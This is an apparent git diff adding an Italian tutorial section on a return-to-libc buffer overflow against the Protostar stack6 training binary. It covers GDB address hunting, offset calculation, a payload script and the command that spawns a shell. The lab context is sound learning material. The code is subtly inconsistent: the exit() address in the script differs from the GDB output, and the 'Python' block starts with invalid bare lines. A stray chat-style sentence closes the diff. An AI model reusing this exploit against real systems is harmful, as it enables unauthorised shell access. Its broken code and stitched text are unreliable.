@@ -362,3 +362,165 @@ Risulta necessario usare due volte `cat` in quanto serve uno STDIN per la shell 
 - il primo cat inietta l'input malevolo ed attiva la shell 
 - il secondo accetta input da STDIN e lo inoltra alla shell 
 
+
+
+<br><br>
+
+## Buffer Overflow - Return to libc  
+
+
+L'obiettivo è ottenere una shell sfruttando una vulnerabilità di buffer overflow, ma aggirando una contromisura di sicurezza specifica attraverso la tecnica "return-to-libc".
+
+### Fase 1: Analisi del Bersaglio e Strategia
+
+### La Vulnerabilità di `gets()` e la contromisura:
+
+Il punto debole è evidente nella funzione `getpath()`:
+```c
+char buffer[64];
+...
+gets(buffer);
+```
+La funzione `gets()` è notoriamente insicura perché non controlla la lunghezza dell'input. Possiamo scrivere ben oltre i 64 byte allocati per il `buffer`, permettendoci di sovrascrivere altre parti importanti dello stack, incluso l'indirizzo di ritorno.
+
+
+Il programma, però, non è indifeso. Subito dopo `gets()`, troviamo questo codice:
+```c
+ret = __builtin_return_address(0);
+if((ret & 0xbf000000) == 0xbf000000) {
+  printf("bzzzt (%p)\n", ret);
+  _exit(1);
+}
+```
+Il codice controlla l'indirizzo a cui la funzione `getpath()` dovrebbe tornare. Se questo indirizzo si trova in un'area di memoria che inizia con `0xbf...` (l'area tipica dello stack), il programma presume un attacco e termina bruscamente. Questo ci impedisce di usare la tecnica classica di iniettare il nostro codice malevolo (shellcode) nello stack e saltare ad esso.
+
+### Return-to-libc
+
+Se non possiamo saltare a codice *nostro* sullo stack, salteremo a codice *già esistente* altrove in memoria. Sfrutteremo le funzioni della libreria standard C (libc), che vengono caricate in memoria insieme al programma.
+
+Il nostro piano è:
+1.  Ignorare completamente lo shellcode.
+2.  Sovrascrivere l'indirizzo di ritorno di `getpath()` non con un puntatore allo stack, ma con l'**indirizzo della funzione `system()`**.
+3.  Poiché `system()` non si trova sullo stack, il suo indirizzo (es. `0xb7...`) supererà il controllo di sicurezza.
+4.  Dobbiamo anche fornire a `system()` i suoi argomenti, costruendo un "falso" stack frame che la funzione possa usare.
+
+## Fase 2: L'Indagine con GDB
+
+Ora usiamo GDB (GNU Debugger) per trovare gli indirizzi esatti di cui abbiamo bisogno. Gli indirizzi sono unici per ogni esecuzione, quindi **bisogna trovare i propri**.
+
+### Passo 1: Preparare l'Ambiente
+Avvia GDB in modo pulito per simulare un ambiente di esecuzione reale:
+```bash
+gdb /opt/protostar/bin/stack6
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) start
+```
+
+### Passo 2: Trovare l'Indirizzo di `system()` e `exit()`
+Questi sono gli indirizzi delle funzioni che vogliamo chiamare. `exit()` ci servirà per terminare il programma in modo pulito dopo aver ottenuto la shell.
+```gdb
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7ec60b0 <__libc_exit>
+```
+
+### Passo 3: Trovare l'Indirizzo del Buffer (Il Passo Cruciale)
+La funzione `system()` ha bisogno di un argomento: un puntatore alla stringa del comando da eseguire (es. `"/bin/sh"`). La strategia più semplice è scrivere questa stringa proprio all'inizio del nostro input, dentro il `buffer`. Ma per farlo, dobbiamo conoscere l'indirizzo esatto del `buffer`.
+
+Per trovare l'indirizzo del buffer:
+
+1.  **Disassembla `getpath` per ottenere una mappa:**
+    ```gdb
+    (gdb) disas getpath
+    ```
+    Scorri l'output e cerca l'istruzione che prepara la chiamata a `gets`. si trova una sequenza simile a questa:
+    ```assembly
+    ...
+    0x080484a4 <getpath+32>:	lea    -0x4c(%ebp),%eax
+    0x080484a7 <getpath+35>:	mov    %eax,(%esp)
+    0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
+    ...
+    ```
+    L'istruzione `lea -0x4c(%ebp), %eax` (0x4c = 76) è la chiave. **L**oad **E**ffective **A**ddress (LEA) calcola un indirizzo (in questo caso, l'indirizzo del buffer a `EBP - 76`) e lo carica nel registro `EAX`. **Non legge il contenuto, carica l'indirizzo stesso.**
+
+2.  **Imposta un breakpoint *dopo* l'istruzione `lea`:**
+    Dobbiamo fermare il programma subito dopo che ha messo l'indirizzo del buffer in `EAX`. Quindi, mettiamo il breakpoint sull'istruzione successiva:
+    ```gdb
+    (gdb) b *0x080484a7
+    ```
+
+3.  **Continua l'esecuzione e ispeziona `EAX`:**
+    Ora fai continuare il programma fino al breakpoint.
+    ```gdb
+    (gdb) c
+    Continuing.
+    ...
+    Breakpoint 1, 0x080484a7 in getpath ()
+    ```
+    Il programma è fermo. L'istruzione `lea` è stata eseguita. L'indirizzo del buffer è ora nel registro `EAX`. Stampiamolo:
+    ```gdb
+    (gdb) x/x $eax
+    0xbffffc8c:	0xb7f0186e
+    ```
+    `0xbffffc8c` è l'indirizzo di inizio del `buffer`.
+
+## Fase 3: Costruzione del Payload
+
+Ora abbiamo tutti i pezzi. Dobbiamo solo assemblarli nel giusto ordine per creare uno stack frame falso che inganni `system()`.
+
+La struttura del nostro input sarà:
+
+1.  **Indirizzo di `system()`:** Questo sovrascrive l'indirizzo di ritorno di `getpath()`.
+2.  **Indirizzo di `exit()`:** Questo funge da indirizzo di ritorno *falso* per `system()`, garantendo una chiusura pulita.
+3.  **Indirizzo del `buffer`:** Questo è il parametro per `system()`: il puntatore al comando.
+
+Il nostro input finale, da scrivere nel programma, sarà quindi strutturato così:
+
+`[Stringa "/bin/sh"] + [Riempimento] + [Indirizzo di system()] + [Indirizzo di exit()] + [Indirizzo del buffer]`
+
+
+Calcoliamo la distanza tra l'inizio del buffer e l'indirizzo di ritorno di `getpath` ossia quello che vogliamo sovrascrivere.  
+
+Questo metodo si basa sulle posizioni relative al nostro punto di riferimento fisso, il registro `EBP`.
+1.  **Dove si trova il nostro bersaglio?** Il nostro bersaglio è l'indirizzo di ritorno di `getpath`. In uno stack frame standard a 32 bit, si trova **sempre** a `EBP + 4`.
+2.  **Dove si trova il nostro punto di partenza?** Il nostro punto di partenza è l'inizio del buffer. Dal disassembly, l'istruzione `lea -0x4c(%ebp), %eax` ci ha rivelato che si trova a `EBP - 0x4c`. Convertendo `0x4c` da esadecimale a decimale otteniamo 76. Quindi, il buffer è a `EBP - 76`.
+3.  **Calcoliamo la distanza:** La distanza tra i due punti è una semplice sottrazione:  
+    `Distanza = (Indirizzo del Bersaglio) - (Indirizzo di Partenza)`
+    `Distanza = (EBP + 4) - (EBP - 76)`
+    I due `EBP` si annullano a vicenda, lasciandoci con:
+    `Distanza = 4 - (-76) = 4 + 76 = 80`
+Ecco da dove vengono gli **80 byte**. Dobbiamo scrivere 80 byte per riempire tutto lo spazio dall'inizio del buffer fino a sovrascrivere il vecchio EBP incluso. Il byte numero 81 sarà il primo byte del nostro nuovo indirizzo di ritorno.
+
+## Fase 4: L'Esecuzione Finale
+
+È il momento di mettere tutto in uno script Python. Ricorda di convertire i tuoi indirizzi in formato **little-endian** (scrivendo i byte al contrario).
+
+```python
+system: 0xb7ecffb0
+exit: 0xb7ec60c0
+buffer: 0xbffffc8c
+
+'''
+buffer: \x8c\xfc\xff\xbf
+system: \xb0\xff\xec\xb7
+exit:  \xc0\x60\xec\xb7
+'''
+
+print('/bin//sh\x00' + 'a'*71 + '\xb0\xff\xec\xb7' +
+      '\xc0\x60\xec\xb7' + '\x8c\xfc\xff\xbf')
+```
+
+**Lancio dell'attacco:**  
+
+```bash
+(cat /tmp/payload; cat) | /opt/protostar/bin/stack6
+
+```
+Il comando `(cat; cat)` invia prima il payload e poi mantiene aperto lo stream di input, permettendoti di interagire con la shell che si aprirà. Se tutto è stato fatto correttamente, vedrai comparire un prompt (`#` o `$`), segno che hai ottenuto il controllo del sistema.
+
+
+Ottimi dubbi, sono esattamente i dettagli che fanno la differenza e dimostrano che stai capendo a fondo il processo! Risolviamoli uno per uno.
+
+---
